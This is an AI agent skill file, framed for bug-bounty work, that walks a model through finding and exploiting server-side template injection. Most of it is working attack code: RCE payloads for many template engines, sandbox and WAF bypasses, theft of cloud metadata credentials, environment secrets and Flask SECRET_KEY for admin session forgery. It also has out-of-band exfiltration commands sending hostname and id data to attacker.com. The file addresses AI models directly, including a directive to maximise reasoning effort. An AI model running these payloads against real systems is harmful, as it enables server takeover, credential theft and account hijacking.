---
name: ssti-hunter
description: Systematically hunt for Server-Side Template Injection vulnerabilities across all major template engines: Jinja2, Twig, Freemarker, Velocity, Smarty, Pebble, Mako, Tornado, Handlebars, ERB, and others. Covers engine fingerprinting via polyglot probes, blind SSTI detection, context-specific payload construction, sandbox escape techniques, and full RCE chain escalation to code execution, file read, and reverse shell. Use this skill whenever a target reflects user input through a template rendering layer, accepts template-like syntax in form fields, email subjects, notification messages, document generators, invoice templates, or any field that produces formatted output. Trigger on phrases like "ssti", "ssti-hunter", "template injection", "test for ssti", "server-side template injection", or when recon reveals Python/Flask/Django/Java/PHP/Ruby stacks with user-controlled rendered output.
---

# SSTI Hunter Skill

You are hunting for Server-Side Template Injection. SSTI is one of the most underreported Critical-class vulnerabilities in modern web applications — developers who use template engines often pass user input directly into `render()` calls without sanitization, because the impact isn't obvious until a security researcher sends `{{7*7}}` and gets `49` back. Your job is to find template injection surfaces, fingerprint the engine with surgical probes, escalate to RCE, and document a complete impact chain.

Run all phases in order. Phase 1 maps surfaces before sending any payloads. Phase 2 fingerprints the engine with non-destructive polyglot probes. Phase 3 escalates to code execution. Phase 4 builds the maximum-impact chain. Phase 5 documents the PoC.

> **THINKING LLM DIRECTIVE — MAXIMUM EFFORT REQUIRED**
> If you are a reasoning/thinking model (o1, o3, Claude with extended thinking, Gemini with thinking, DeepSeek-R1, QwQ, or any model with a dedicated reasoning/thinking phase): **activate maximum thinking budget for this skill**. Engine fingerprinting from ambiguous probe responses, sandbox escape path selection, and RCE chain construction require deep multi-step reasoning. A wrong engine identification means all subsequent payloads fail silently. Think fully at every phase transition. Do not truncate your reasoning.

---

## Prerequisites

- Burp Suite active and proxying all requests
- Two accounts (attacker + victim) if testing stored SSTI surfaces
- Target tech stack identified from recon (`/cve-vuln-check` output, response headers, JS bundles, error pages)
- All assets confirmed IN SCOPE via `/scope-checker`

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/ssti
```

---

## Phase 1 — Surface Mapping

### Step 1.1 — Identify Template Rendering Surfaces from Recon

SSTI surfaces are anywhere user input flows into a template render call. Prioritize:

| Priority | Surface Type | Why |
|---|---|---|
| **Critical** | Email subject / body templates | Rendered server-side, often unsandboxed |
| **Critical** | PDF / document generators | Typically use Freemarker, Velocity, or Jinja2 |
| **Critical** | Notification / alert message fields | Custom messages passed to render() |
| **High** | User profile display name / bio | Rendered into pages or emails for others |
| **High** | Search query reflected in page headers | "Results for: {query}" pattern |
| **High** | Error message customization | Custom 404/error text |
| **Medium** | Invoice / report title fields | Document generation pipelines |
| **Medium** | Webhook payload templates | Template strings in integration configs |
| **Low** | URL path segments reflected in body | Less common but worth probing |

```bash
# Search katana/wayback output for template-like patterns in parameters
grep -iEh '(template|render|preview|subject|body|message|content|format|layout|theme|email|notify|alert|report|invoice|pdf|doc)' \
  $TARGET_DIR/recon/api/all-endpoints.txt \
  $TARGET_DIR/recon/api/katana-crawl.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/ssti/candidate-surfaces.txt

echo "[*] SSTI candidate surfaces: $(wc -l < $TARGET_DIR/recon/ssti/candidate-surfaces.txt)"
cat $TARGET_DIR/recon/ssti/candidate-surfaces.txt | head -30
```

### Step 1.2 — Identify Tech Stack for Engine Prediction

```bash
# Check stack fingerprints already collected from recon
echo "[*] Tech stack indicators:"
grep -iE '(python|flask|django|jinja|tornado|mako|ruby|rails|erb|java|spring|freemarker|velocity|pebble|php|smarty|twig|laravel|blade|node|handlebars|mustache|nunjucks|pug|jade)' \
  $TARGET_DIR/recon/js/secrets-*.txt \
  $TARGET_DIR/recon/api/api-surface.md 2>/dev/null | head -20

# Check response headers for server/framework hints
curl -sk -I "https://$TARGET_DOMAIN/" | grep -iE '(server|x-powered-by|x-framework|set-cookie)'
```

Use this to pre-select likely engines before probing:

| Stack | Likely Engine |
|---|---|
| Python / Flask | Jinja2 |
| Python / Django | Django templates |
| Python / Tornado | Tornado / Mako |
| Ruby / Rails | ERB / Haml |
| Java / Spring | Thymeleaf / Freemarker / Velocity |
| PHP / Laravel | Blade / Twig |
| PHP / Symfony | Twig |
| PHP / Smarty | Smarty |
| Node.js | Handlebars / Nunjucks / Pug / EJS |
| Go | text/template |

---

## Phase 2 — Engine Fingerprinting

Never jump straight to RCE payloads. Fingerprint first with non-destructive mathematical probes that produce engine-specific outputs. A wrong payload on the wrong engine will be silently ignored or cause an error that looks like a block.

### Step 2.1 — Polyglot Detection Probe

Inject a single polyglot that triggers evaluation in multiple engines and observe the response:

```bash
# Polyglot probe — safe, math-only, no code execution
POLYGLOT='${{<%[%"}}%\\'

curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${POLYGLOT}" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10 | \
  grep -iE '(error|exception|syntax|unexpected|template|parse|render)' | head -5
```

An error referencing a template engine in the response immediately confirms SSTI surface and leaks the engine name. If an error is thrown, record it and skip to the engine-specific phase.

### Step 2.2 — Mathematical Fingerprint Probes

Inject each probe separately and record the exact output:

```bash
FINGERPRINT_PROBES=(
  '{{7*7}}'           # Jinja2/Twig -> 49; Freemarker -> error
  '${7*7}'            # Freemarker/Velocity -> 49; Jinja2 -> literal
  '<%= 7*7 %>'        # ERB -> 49
  '#{7*7}'            # Ruby string interpolation -> 49
  '{7*7}'             # Smarty -> literal (not evaluated)
  '{{7*"7"}}'         # Jinja2 -> 7777777; Twig -> 49
  '${{7*7}}'          # Twig -> 49
  '@{7*7}'            # Thymeleaf -> 49
  '*{7*7}'            # Thymeleaf -> 49
  '[[${7*7}]]'        # Thymeleaf inline -> 49
  '{#7*7#}'           # Smarty -> comment (not evaluated)
  '<#assign x=7*7>${x}' # Freemarker -> 49
  '#{"test".length()}' # Thymeleaf -> 4
)

for PROBE in "${FINGERPRINT_PROBES[@]}"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PROBE}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 8 | \
    grep -o "${PROBE//[{}$<>\*@#]/\.}\|49\|7777777\|error\|exception" | head -1)
  echo "[PROBE] ${PROBE} -> ${RESULT:-no-match}"
done 2>/dev/null > $TARGET_DIR/recon/ssti/fingerprint-results.txt

cat $TARGET_DIR/recon/ssti/fingerprint-results.txt
```

### Step 2.3 — Engine Decision Table

Use probe results to identify the engine:

| Probe | Output | Engine |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2, Twig, or Pebble |
| `{{7*"7"}}` | `7777777` | **Jinja2** (confirmed) |
| `{{7*"7"}}` | `49` | **Twig** (confirmed) |
| `${7*7}` | `49` | Freemarker or Velocity |
| `<#assign x=7*7>${x}` | `49` | **Freemarker** (confirmed) |
| `<%= 7*7 %>` | `49` | **ERB** (confirmed) |
| `@{7*7}` or `*{7*7}` | `49` | **Thymeleaf** (confirmed) |
| `#{7*7}` | `49` | **Ruby interpolation / Pug** |
| Any probe | Template/parse error with engine name | Engine named in error |
| All probes | Literal reflection | Not vulnerable, or heavily filtered |

Record confirmed engine:
```bash
echo "ENGINE: [CONFIRMED ENGINE]" >> $TARGET_DIR/recon/ssti/fingerprint-results.txt
```

---

## Phase 3 — Payload Escalation by Engine

Use ONLY the section for the confirmed engine. Do not attempt cross-engine payloads.

### Jinja2 (Python)

```bash
# Step 1: Confirm RCE capability — read /etc/passwd
JINJA2_FILE_READ='{{"".__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read()}}'

# Step 2: RCE via subprocess (Python 3)
JINJA2_RCE='{{"".__class__.__mro__[1].__subclasses__()[317]("id",shell=True,stdout=-1).communicate()[0].strip()}}'
# Note: subclass index varies — use the config object method for reliability:
JINJA2_RCE_CONFIG='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'

# Step 3: RCE via cycler (Jinja2 globals)
JINJA2_RCE_CYCLER='{{cycler.__init__.__globals__.os.popen("id").read()}}'

# Step 4: RCE via lipsum
JINJA2_RCE_LIPSUM='{{lipsum.__globals__["os"].popen("id").read()}}'

# Test each
for PAYLOAD in "$JINJA2_RCE_CONFIG" "$JINJA2_RCE_CYCLER" "$JINJA2_RCE_LIPSUM"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10)
  echo "$RESULT" | grep -qE '(root:|uid=|www-data)' && echo "[RCE] $PAYLOAD" && break
done
```

**Jinja2 sandbox escape (if sandboxed):**
```bash
# Bypass _Sandbox_ via request object (Flask)
JINJA2_SANDBOX_1='{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'
# Via attr filter
JINJA2_SANDBOX_2='{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()}}'
# Via format string
JINJA2_SANDBOX_3='{{"%s"|format("__import__(\x27os\x27).popen(\x27id\x27).read()")}}'
```

### Twig (PHP)

```bash
# RCE via _self.env
TWIG_RCE='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
# Via system
TWIG_RCE2='{{["id"]|map("system")}}'
# PHP passthru
TWIG_RCE3='{{["id",0]|sort("passthru")}}'

for PAYLOAD in "$TWIG_RCE" "$TWIG_RCE2" "$TWIG_RCE3"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10)
  echo "$RESULT" | grep -qE '(root:|uid=|www-data)' && echo "[RCE] $PAYLOAD" && break
done
```

### Freemarker (Java)

```bash
# RCE via freemarker.template.utility
FM_RCE='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
# Via ObjectConstructor
FM_RCE2='<#assign ob="freemarker.template.utility.ObjectConstructor"?new()><#assign ex=ob("freemarker.template.utility.Execute")>${ex("id")}'
# File read
FM_FILE='${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}'

for PAYLOAD in "$FM_RCE" "$FM_RCE2" "$FM_FILE"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10)
  echo "$RESULT" | grep -qE '(root:|uid=|www-data)' && echo "[RCE] $PAYLOAD" && break
done
```

### Velocity (Java)

```bash
# RCE via Runtime
VEL_RCE='#set($x=$class.inspect("java.lang.Runtime").type.getMethod("exec",[$class.inspect("java.lang.String").type]).invoke($class.inspect("java.lang.Runtime").type.getMethod("getRuntime").invoke(null),"id"))$x'
# Simpler via ClassTool
VEL_RCE2='#set($rt = $class.forName("java.lang.Runtime"))#set($chr = $class.forName("java.lang.Character"))#set($str = $class.forName("java.lang.String"))#set($ex=$rt.getMethod("exec",$str.class).invoke($rt.getMethod("getRuntime").invoke(null),"id"))'
```

### Thymeleaf (Java / Spring)

```bash
# RCE via SpringEL — only works if Spring context is available
THYME_RCE='__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x'
# Fragment injection
THYME_RCE2='__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()}__::.x'
```

### ERB (Ruby)

```bash
# RCE via Ruby backtick or system
ERB_RCE='<%= `id` %>'
ERB_RCE2='<%= system("id") %>'
ERB_RCE3='<%= IO.popen("id").read %>'

for PAYLOAD in "$ERB_RCE" "$ERB_RCE2" "$ERB_RCE3"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10)
  echo "$RESULT" | grep -qE '(root:|uid=|www-data)' && echo "[RCE] $PAYLOAD" && break
done
```

### Smarty (PHP)

```bash
SMARTY_RCE='{php}echo `id`;{/php}'
SMARTY_RCE2='{"shell_exec"("id")}'
SMARTY_RCE3='{"system"("id")}'
```

### Handlebars / Nunjucks (Node.js)

```bash
# Handlebars prototype pollution RCE
HB_RCE='{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\x27child_process\x27).execSync(\x27id\x27).toString();"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'

# Nunjucks
NJK_RCE='{{range.constructor("return global.process.mainModule.require(\x27child_process\x27).execSync(\x27id\x27).toString()")()}}'
```

---

## Phase 4 — Impact Chain Escalation

Once RCE is confirmed, escalate to the highest demonstrable impact:

### Step 4.1 — File Read (cloud metadata & secrets)

```bash
# /etc/passwd — confirm OS-level access
read_file_jinja2() {
  curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}={{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10 | grep -A2 'root:'
}

# Cloud metadata — SSRF + SSTI combo for maximum impact
META_CMD="curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/"
META_PAYLOAD="{{config.__class__.__init__.__globals__['os'].popen('${META_CMD}').read()}}"

curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${META_PAYLOAD}" \
  -H "Cookie: $SESSION_COOKIE" --max-time 15
```

### Step 4.2 — Environment Variables (secrets, keys, tokens)

```bash
# Dump env — often contains DATABASE_URL, SECRET_KEY, AWS credentials, API tokens
ENV_PAYLOAD="{{config.__class__.__init__.__globals__['os'].environ}}"

curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${ENV_PAYLOAD}" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10 | \
  grep -iE '(secret|key|token|password|api|aws|database|db_|redis|mongo)' | head -20
```

### Step 4.3 — Reverse Shell (for critical-severity demonstration)

> Only attempt if: program explicitly allows it, or the finding is already Critical and a shell would add no marginal proof beyond `id` + env dump. Most programs accept `id` + `/etc/passwd` + env variables as sufficient for Critical SSTI. Do not establish a persistent reverse shell.

```bash
# OOB confirmation payload — sends hostname + id to attacker-controlled server
OOB_CMD="curl -sk https://attacker.com/ssti-poc?h=\$(hostname)\&u=\$(id|base64)"
OOB_PAYLOAD="{{config.__class__.__init__.__globals__['os'].popen('${OOB_CMD}').read()}}"
```

### Step 4.4 — Application Secret Key Extraction (Flask/Django)

```bash
# Flask SECRET_KEY — enables session forgery (separate High/Critical finding)
SECRET_PAYLOAD='{{config.SECRET_KEY}}'
DEBUG_PAYLOAD='{{config}}'

curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${SECRET_PAYLOAD}" \
  -H "Cookie: $SESSION_COOKIE" --max-time 10

# If SECRET_KEY is returned, forge admin session using flask-unsign:
# flask-unsign --sign --cookie "{'user_id': 1, 'role': 'admin'}" --secret 'LEAKED_SECRET'
```

---

## Phase 5 — PoC Documentation

```bash
cat >> $TARGET_DIR/findings/ssti-$(date +%Y%m%d-%H%M).md << 'EOF'
## SSTI Finding

**URL:** [exact vulnerable URL]
**Parameter:** [param name]
**Method:** GET / POST
**Engine:** [Jinja2 / Twig / Freemarker / Velocity / Thymeleaf / ERB / Smarty / Handlebars]
**Detection probe:** [probe used, e.g. {{7*"7"}} -> 7777777]
**RCE payload:** [exact payload used]
**RCE output:** [exact command output, e.g. uid=33(www-data)]
**Secrets extracted:** [SECRET_KEY / env vars / cloud credentials — redact actual values in report]

**Request:**
```
[full HTTP request]
```

**Response (relevant excerpt):**
```
[response showing RCE output or secret]
```

**Impact:** Remote Code Execution on [server OS + version if available]. 
Attacker can read arbitrary files, extract application secrets, pivot to internal network, or establish persistent access.
EOF
```

Run `/triager` before submitting. SSTI with RCE is almost always Critical — do not understate it.

---

## Blind SSTI

If no output is reflected (blind rendering — e.g. email templates, background PDF generation):

```bash
# Time-based detection (sleep)
TIME_JINJA2='{{"".__class__.__mro__[1].__subclasses__()[317]("sleep 5",shell=True)}}'
TIME_TWIG='{{"id"|system}}'
TIME_FM='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}'

# Measure response time differential
for PAYLOAD in "$TIME_JINJA2" "$TIME_FM"; do
  START=$(date +%s%N)
  curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 15 > /dev/null
  END=$(date +%s%N)
  DIFF=$(( (END - START) / 1000000 ))
  echo "[TIME] ${DIFF}ms — ${PAYLOAD:0:30}"
done

# OOB exfiltration for blind confirmation
OOB_JINJA2="{{config.__class__.__init__.__globals__['os'].popen('curl -sk https://YOUR_COLLAB_URL/ssti?x=\$(id|base64)').read()}}"
```

---

## Filter Bypass Techniques

When basic payloads are blocked by WAF or input filtering:

```bash
# Jinja2 — bypass dot notation with attr()
'{{()|attr("__class__")|attr("__mro__")|list}}'

# Jinja2 — bypass keyword filters with string concatenation
'{{"__cla"~"ss__"}}'

# Jinja2 — bypass underscore filter with request args
# Inject: ?x=__class__&param={{request.args.x}}

# Jinja2 — bypass via hex encoding
'{{"\x5f\x5fclass\x5f\x5f"}}'

# Twig — bypass via filters
'{{"id"|system}}'

# Freemarker — bypass via new() with alternate class names
'<#assign cl=object?api.class>${cl.forName("freemarker.template.utility.Execute")?new()("id")}'

# Generic — URL encode the payload if reflected through URL parameters
# %7b%7b7*7%7d%7d -> {{7*7}}
```

---

## Severity Reference

| Finding | Severity |
|---|---|
| SSTI with RCE confirmed (id, /etc/passwd, env dump) | Critical |
| SSTI with secret key extraction (Flask/Django SECRET_KEY) | Critical |
| SSTI with cloud metadata access (AWS IMDSv1) | Critical |
| SSTI with file read only (no RCE, no secrets) | High |
| Blind SSTI confirmed via time-based or OOB | High |
| SSTI expression evaluation only (math result, no code exec) | Medium |
| Template syntax reflected without evaluation (literal `{{7*7}}`) | Informational |

---

## Guiding Principles

- **Fingerprint before exploiting.** A Jinja2 payload on a Twig engine fails silently and wastes the entire phase. Two targeted probes take 10 seconds and save hours.
- **`{{7*7}}` alone is not a finding.** Math evaluation with no code exec path is Medium at best on most programs. Build to RCE or secret extraction before submitting.
- **Blind SSTI is still SSTI.** Time-based and OOB confirmation are valid PoC methods. Document the time differential precisely (e.g., 5001ms vs 312ms control).
- **SECRET_KEY is its own finding.** If you extract a Flask/Django secret key, that is a separate High/Critical — session forgery allows account takeover without any SSTI interaction. Report both.
- **Do not run destructive commands.** `id`, `hostname`, `cat /etc/passwd`, `env`, and OOB curl are sufficient for Critical. Do not run `rm`, `chmod`, or install tools. Do not establish persistent shells.
- **Run /triager before submitting.** SSTI with only math evaluation and no RCE path will be downgraded. Confirm code execution or secret extraction first.
